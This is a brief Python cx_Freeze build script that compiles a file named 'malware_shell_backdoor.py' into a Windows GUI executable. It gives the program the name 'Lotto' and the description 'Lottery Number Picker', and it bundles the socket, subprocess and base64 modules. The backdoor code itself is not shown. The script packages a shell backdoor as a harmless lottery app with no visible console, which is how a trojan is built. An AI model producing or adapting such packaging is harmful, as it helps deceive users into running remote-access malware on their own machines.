import sys
from cx_Freeze import setup, Executable

base = None
if sys.platform == 'win32' : base = 'Win32GUI'

opts = { 'include_files' : ['logo.gif'], 'includes' : [ 'sys', 'base64', 'os', 'socket', 'subprocess' ] }

setup(
    name = 'Lotto' ,
    version = '1.0' ,
    description = 'Lottery Number Picker' ,
    author = 'Mike McGrath' ,
    options = {'build_exe' : opts } ,
    executables = [ Executable( 'malware_shell_backdoor.py' , base = base ) ] )